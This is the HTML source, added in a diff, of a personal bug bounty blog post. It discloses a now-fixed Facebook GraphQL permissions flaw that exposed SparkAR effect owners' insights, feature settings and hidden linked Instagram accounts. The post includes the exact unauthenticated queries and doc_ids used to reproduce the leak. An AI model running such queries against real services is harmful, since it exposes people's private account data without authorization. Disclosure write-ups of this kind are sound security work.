@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Access private information about SparkAR effect owners who has a publicly viewable portfolio | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Access private information about SparkAR effect owners who has a publicly viewable portfolio" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description This bug could allow a malicious user to access private information about a SparkAR effect owner who has published his/her portfolio in&nbsp;https://www.facebook.com/sparkarhub/gallery/. Due to missing permissions checking in the ARCreatorProfile object which insecurely make a Connection to an AREffectOwner object , an attacker can access information about the effect owner like enabled/disabled features, surface configs, insights , test groups and sections. Also, i found that it&#39;s possible to leak linked Instagram account of a page if the page has a publicly viewable portfolio. This was due to a misconfigured (ACLs) connection in the field &quot;effect_owner&quot;. Reproduction Steps Make a POST request to&nbsp;https://www.facebook.com/api/graphql/&nbsp;without cookies and with this in the request body: q=node(PROFILE_ID){effect_owner{insights_v2{impressions{total,timeline{time,value}},opens{total,timeline{time,value}}}}}} where PROFILE_ID is the id of the portfolio/profile (GraphQL obj ARCreatorProfile). This particular query would only return some insights but more detailed ones could be returned (like engagements). Same thing could be done to surface configs or enabled features in the account (This could be used to identify employees). q=node(PROFILE_ID){effect_owner{surface_configs{surface,is_unified_publishing_enabled,capabilities_surface,usecase,is_arexport_file_enabled,is_effect_name_enabled,is_thumbnail_enabled,is_preview_video_enabled,is_screencast_enabled,is_review_description_enabled,is_category_enabled,is_attribution_enabled,is_thumbnail_cropping_tool_enabled,are_review_appeals_enabled,effect_name_max_length,arfx_max_size,ar_export_max_size,is_guidance_enabled,is_ig_attribution_enabled,attribution_types_supported,category_max_num,is_tags_enabled,is_preview_video_capture_link_enabled,is_scheduling_enabled,is_location_targeting_enabled,is_dogfooding_enabled,is_legal_agreement_enabled,is_ads_legal_agreement_enabled}}} q=node(PROFILE_ID){effect_owner{is_ar_manager}} q=node(PROFILE_ID){effect_owner{test_groups{nodes{id}}}} q=node(PROFILE_ID){effect_owner{sections{nodes{id}}}} Leaking Instagram account linked to a page As a Page actor, visit&nbsp;https://www.facebook.com/sparkarhub/portfolios/me/. Click on &quot;Edit profile&quot;, and uncheck the option to show Instagram or Facebook. As a second user, visit&nbsp;https://www.facebook.com/sparkarhub/portfolios/{PROFILE_ID}/&nbsp;and you&#39;ll not get the IG or FB account. The graphql query to get portfolio information is the one with doc_id=3716679588376054 which would contain a field visible_ig_accounts that shows the ig account based on the user choice (variables={&quot;profileId&quot;:&quot;PROFILE_ID&quot;}&amp;doc_id=3716679588376054) . However, the owner editing query of the portfolio would contain another field &quot;linked_ig&quot; which always would return linked IG account of the page/user. The attacker would simply use this graphql query against a publicly viewable portfolio and get the IG account linked. So two ways to reproduce this: Send a POST request to&nbsp;www.facebook.com/api/graphql/&nbsp;without cookies and with this in the body: variables={&quot;profileId&quot;:&quot;PROFILE_ID&quot;}&amp;doc_id=3798020423541326and you should get the id of the Instagram account in &quot;linked_ig&quot; field. Timeline Dec 10, 2020&mdash; Report Sent Dec 30, 2020&mdash;  Acknowledged by FacebookJan 11, 2021&mdash; Fixed by FacebookFeb 1, 2021 &mdash; $1500 bounty awarded by Facebook." />
+<meta property="og:description" content="Description This bug could allow a malicious user to access private information about a SparkAR effect owner who has published his/her portfolio in&nbsp;https://www.facebook.com/sparkarhub/gallery/. Due to missing permissions checking in the ARCreatorProfile object which insecurely make a Connection to an AREffectOwner object , an attacker can access information about the effect owner like enabled/disabled features, surface configs, insights , test groups and sections. Also, i found that it&#39;s possible to leak linked Instagram account of a page if the page has a publicly viewable portfolio. This was due to a misconfigured (ACLs) connection in the field &quot;effect_owner&quot;. Reproduction Steps Make a POST request to&nbsp;https://www.facebook.com/api/graphql/&nbsp;without cookies and with this in the request body: q=node(PROFILE_ID){effect_owner{insights_v2{impressions{total,timeline{time,value}},opens{total,timeline{time,value}}}}}} where PROFILE_ID is the id of the portfolio/profile (GraphQL obj ARCreatorProfile). This particular query would only return some insights but more detailed ones could be returned (like engagements). Same thing could be done to surface configs or enabled features in the account (This could be used to identify employees). q=node(PROFILE_ID){effect_owner{surface_configs{surface,is_unified_publishing_enabled,capabilities_surface,usecase,is_arexport_file_enabled,is_effect_name_enabled,is_thumbnail_enabled,is_preview_video_enabled,is_screencast_enabled,is_review_description_enabled,is_category_enabled,is_attribution_enabled,is_thumbnail_cropping_tool_enabled,are_review_appeals_enabled,effect_name_max_length,arfx_max_size,ar_export_max_size,is_guidance_enabled,is_ig_attribution_enabled,attribution_types_supported,category_max_num,is_tags_enabled,is_preview_video_capture_link_enabled,is_scheduling_enabled,is_location_targeting_enabled,is_dogfooding_enabled,is_legal_agreement_enabled,is_ads_legal_agreement_enabled}}} q=node(PROFILE_ID){effect_owner{is_ar_manager}} q=node(PROFILE_ID){effect_owner{test_groups{nodes{id}}}} q=node(PROFILE_ID){effect_owner{sections{nodes{id}}}} Leaking Instagram account linked to a page As a Page actor, visit&nbsp;https://www.facebook.com/sparkarhub/portfolios/me/. Click on &quot;Edit profile&quot;, and uncheck the option to show Instagram or Facebook. As a second user, visit&nbsp;https://www.facebook.com/sparkarhub/portfolios/{PROFILE_ID}/&nbsp;and you&#39;ll not get the IG or FB account. The graphql query to get portfolio information is the one with doc_id=3716679588376054 which would contain a field visible_ig_accounts that shows the ig account based on the user choice (variables={&quot;profileId&quot;:&quot;PROFILE_ID&quot;}&amp;doc_id=3716679588376054) . However, the owner editing query of the portfolio would contain another field &quot;linked_ig&quot; which always would return linked IG account of the page/user. The attacker would simply use this graphql query against a publicly viewable portfolio and get the IG account linked. So two ways to reproduce this: Send a POST request to&nbsp;www.facebook.com/api/graphql/&nbsp;without cookies and with this in the body: variables={&quot;profileId&quot;:&quot;PROFILE_ID&quot;}&amp;doc_id=3798020423541326and you should get the id of the Instagram account in &quot;linked_ig&quot; field. Timeline Dec 10, 2020&mdash; Report Sent Dec 30, 2020&mdash;  Acknowledged by FacebookJan 11, 2021&mdash; Fixed by FacebookFeb 1, 2021 &mdash; $1500 bounty awarded by Facebook." />
+<link rel="canonical" href="http://localhost:4000/uncategorized/2021/02/17/access-private-information-about-sparkar-effect-owners-who-has-a-publicly-viewable-portfolio.html" />
+<meta property="og:url" content="http://localhost:4000/uncategorized/2021/02/17/access-private-information-about-sparkar-effect-owners-who-has-a-publicly-viewable-portfolio.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-17T09:46:02+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Access private information about SparkAR effect owners who has a publicly viewable portfolio" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-02-17T09:46:02+01:00","datePublished":"2021-02-17T09:46:02+01:00","description":"Description This bug could allow a malicious user to access private information about a SparkAR effect owner who has published his/her portfolio in&nbsp;https://www.facebook.com/sparkarhub/gallery/. Due to missing permissions checking in the ARCreatorProfile object which insecurely make a Connection to an AREffectOwner object , an attacker can access information about the effect owner like enabled/disabled features, surface configs, insights , test groups and sections. Also, i found that it&#39;s possible to leak linked Instagram account of a page if the page has a publicly viewable portfolio. This was due to a misconfigured (ACLs) connection in the field &quot;effect_owner&quot;. Reproduction Steps Make a POST request to&nbsp;https://www.facebook.com/api/graphql/&nbsp;without cookies and with this in the request body: q=node(PROFILE_ID){effect_owner{insights_v2{impressions{total,timeline{time,value}},opens{total,timeline{time,value}}}}}} where PROFILE_ID is the id of the portfolio/profile (GraphQL obj ARCreatorProfile). This particular query would only return some insights but more detailed ones could be returned (like engagements). Same thing could be done to surface configs or enabled features in the account (This could be used to identify employees). q=node(PROFILE_ID){effect_owner{surface_configs{surface,is_unified_publishing_enabled,capabilities_surface,usecase,is_arexport_file_enabled,is_effect_name_enabled,is_thumbnail_enabled,is_preview_video_enabled,is_screencast_enabled,is_review_description_enabled,is_category_enabled,is_attribution_enabled,is_thumbnail_cropping_tool_enabled,are_review_appeals_enabled,effect_name_max_length,arfx_max_size,ar_export_max_size,is_guidance_enabled,is_ig_attribution_enabled,attribution_types_supported,category_max_num,is_tags_enabled,is_preview_video_capture_link_enabled,is_scheduling_enabled,is_location_targeting_enabled,is_dogfooding_enabled,is_legal_agreement_enabled,is_ads_legal_agreement_enabled}}} q=node(PROFILE_ID){effect_owner{is_ar_manager}} q=node(PROFILE_ID){effect_owner{test_groups{nodes{id}}}} q=node(PROFILE_ID){effect_owner{sections{nodes{id}}}} Leaking Instagram account linked to a page As a Page actor, visit&nbsp;https://www.facebook.com/sparkarhub/portfolios/me/. Click on &quot;Edit profile&quot;, and uncheck the option to show Instagram or Facebook. As a second user, visit&nbsp;https://www.facebook.com/sparkarhub/portfolios/{PROFILE_ID}/&nbsp;and you&#39;ll not get the IG or FB account. The graphql query to get portfolio information is the one with doc_id=3716679588376054 which would contain a field visible_ig_accounts that shows the ig account based on the user choice (variables={&quot;profileId&quot;:&quot;PROFILE_ID&quot;}&amp;doc_id=3716679588376054) . However, the owner editing query of the portfolio would contain another field &quot;linked_ig&quot; which always would return linked IG account of the page/user. The attacker would simply use this graphql query against a publicly viewable portfolio and get the IG account linked. So two ways to reproduce this: Send a POST request to&nbsp;www.facebook.com/api/graphql/&nbsp;without cookies and with this in the body: variables={&quot;profileId&quot;:&quot;PROFILE_ID&quot;}&amp;doc_id=3798020423541326and you should get the id of the Instagram account in &quot;linked_ig&quot; field. Timeline Dec 10, 2020&mdash; Report Sent Dec 30, 2020&mdash;  Acknowledged by FacebookJan 11, 2021&mdash; Fixed by FacebookFeb 1, 2021 &mdash; $1500 bounty awarded by Facebook.","headline":"Access private information about SparkAR effect owners who has a publicly viewable portfolio","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/uncategorized/2021/02/17/access-private-information-about-sparkar-effect-owners-who-has-a-publicly-viewable-portfolio.html"},"url":"http://localhost:4000/uncategorized/2021/02/17/access-private-information-about-sparkar-effect-owners-who-has-a-publicly-viewable-portfolio.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Access private information about SparkAR effect owners who has a publicly viewable portfolio</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-02-17T09:46:02+01:00" itemprop="datePublished">Feb 17, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><!-- wp:paragraph --></p>
+<p><strong>Description</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>This bug could allow a malicious user to access private information about a SparkAR effect owner who has published his/her portfolio in&nbsp;<a rel="noreferrer noopener" href="https://www.facebook.com/sparkarhub/gallery/" target="_blank">https://www.facebook.com/sparkarhub/gallery/</a>. Due to missing permissions checking in the ARCreatorProfile object which insecurely make a Connection to an AREffectOwner object , an attacker can access information about the effect owner like enabled/disabled features, surface configs, insights , test groups and sections. Also, i found that it's possible to leak linked Instagram account of a page if the page has a publicly viewable portfolio. This was due to a misconfigured (ACLs) connection in the field "effect_owner".</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:more --><br />
+<!--more--><br />
+<!-- /wp:more --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Reproduction Steps</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Make a POST request to&nbsp;<a href="https://www.facebook.com/api/graphql/">https://www.facebook.com/api/graphql/</a>&nbsp;without cookies and with this in the request body:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>q=node(PROFILE_ID){effect_owner{insights_v2{impressions{total,timeline{time,value}},opens{total,timeline{time,value}}}}}} <br>where PROFILE_ID is the id of the portfolio/profile (GraphQL obj ARCreatorProfile).</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>This particular query would only return some insights but more detailed ones could be returned (like engagements).</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Same thing could be done to surface configs or enabled features in the account (This could be used to identify employees).</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>q=node(PROFILE_ID){effect_owner{surface_configs{surface,is_unified_publishing_enabled,capabilities_surface,usecase,is_arexport_file_enabled,is_effect_name_enabled,is_thumbnail_enabled,is_preview_video_enabled,is_screencast_enabled,is_review_description_enabled,is_category_enabled,is_attribution_enabled,is_thumbnail_cropping_tool_enabled,are_review_appeals_enabled,effect_name_max_length,arfx_max_size,ar_export_max_size,is_guidance_enabled,is_ig_attribution_enabled,attribution_types_supported,category_max_num,is_tags_enabled,is_preview_video_capture_link_enabled,is_scheduling_enabled,is_location_targeting_enabled,is_dogfooding_enabled,is_legal_agreement_enabled,is_ads_legal_agreement_enabled}}}</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>q=node(PROFILE_ID){effect_owner{is_ar_manager}}</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>q=node(PROFILE_ID){effect_owner{test_groups{nodes{id}}}}</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>q=node(PROFILE_ID){effect_owner{sections{nodes{id}}}}</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Leaking Instagram account linked to a page</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>As a Page actor, visit&nbsp;<a href="https://www.facebook.com/sparkarhub/portfolios/me/" rel="noreferrer noopener" target="_blank">https://www.facebook.com/sparkarhub/portfolios/me/</a>. Click on "Edit profile", and uncheck the option to show Instagram or Facebook.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>As a second user, visit&nbsp;<a rel="noreferrer noopener" href="https://www.facebook.com/sparkarhub/portfolios/%7BPROFILE_ID%7D/" target="_blank">https://www.facebook.com/sparkarhub/portfolios/{PROFILE_ID}/</a>&nbsp;and you'll not get the IG or FB account.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The graphql query to get portfolio information is the one with doc_id=3716679588376054 which would contain a field visible_ig_accounts that shows the ig account based on the user choice (variables={"profileId":"PROFILE_ID"}&amp;doc_id=3716679588376054) . <br>However, the owner editing query of the portfolio would contain another field "<strong>linked_ig</strong>" which always would return linked IG account of the page/user. The attacker would simply use this graphql query against a publicly viewable portfolio and get the IG account linked. So two ways to reproduce this:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Send a POST request to&nbsp;<a href="https://www.facebook.com/api/graphql/" rel="noreferrer noopener" target="_blank">www.facebook.com/api/graphql/</a>&nbsp;without cookies and with this in the body:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>variables={"profileId":"PROFILE_ID"}&amp;<br>doc_id=3798020423541326<br>and you should get the id of the Instagram account in "linked_ig" field.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Timeline</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Dec 10, 2020&mdash; Report Sent <br>Dec 30, 2020&mdash;  Acknowledged by Facebook<br>Jan 11, 2021&mdash; Fixed by Facebook<br>Feb 1, 2021 &mdash; $1500 bounty awarded by Facebook.</p>
+<p><!-- /wp:paragraph --></p>
+
+  </div><a class="u-url" href="/uncategorized/2021/02/17/access-private-information-about-sparkar-effect-owners-who-has-a-publicly-viewable-portfolio.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
